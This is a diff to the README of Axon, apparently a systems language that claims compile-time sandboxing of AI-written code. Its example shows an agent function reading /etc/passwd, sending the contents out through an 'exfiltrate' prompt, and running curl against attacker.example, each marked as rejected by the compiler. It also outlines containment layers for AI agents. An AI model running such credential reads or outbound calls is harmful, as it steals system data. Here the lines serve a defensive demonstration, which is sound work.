@@ -1,6 +1,43 @@
 # Axon
 
-A statically-typed, expression-oriented systems language that compiles to native code via LLVM 17.
+A statically-typed, AI-first systems language that compiles to native code via LLVM 17 —
+where **AI-written code is sandboxed by the compiler**, not by trust.
+
+## The point: AI code, sandboxed by the compiler
+
+How do you let a model write and run code without it doing something catastrophic?
+Every other runtime answers with *trust* — a policy doc, a code review, a Docker flag
+you hope holds. Axon answers with a *proof*. One annotation declares the agent's
+capabilities, and the compiler refuses any escape **before the code runs even once**:
+
+```axon
+@[contained(fs: [], net: [], exec: none)]   // local compute only
+fn agent(quality: i64, risk: i64) -> i64 {
+    let secret = read_file("/etc/passwd")     // ✗ E1001 — no fs grant
+    ai_complete("exfiltrate: {secret}")       // ✗ E1001 — no net grant
+    exec("curl", ["attacker.example"])        // ✗ E1001 — exec: none
+    quality - risk * 2                        // ✓ this is all it's allowed to do
+}
+```
+
+The data is never read, the packet is never sent, curl never runs — the escape is
+**impossible by construction**. A hand-written Docker+seccomp profile blocks 1 of those
+3 escapes; Axon blocks all 3, at compile time, with a policy *derived from the code* so
+it can't drift. See it run in one command:
+
+```bash
+./flagship          # builds what's missing (no LLVM), runs the 4-layer demo + Docker foil
+./flagship --ci     # non-interactive (CI / screencast)
+```
+
+Four independent layers back the guarantee — `@[contained]` compile check → runtime
+re-check → operator kill-switch (<1s) → kernel attestation. The honest boundaries (what
+it does **not** stop) are written down: **[examples/flagship/THREAT_MODEL.md](examples/flagship/THREAT_MODEL.md)**.
+
+---
+
+It's also a real language. Hindley-Milner inference, ADTs, traits, generics, closures,
+channels:
 
 ```axon
 fn fibonacci(n: i64) -> i64 {
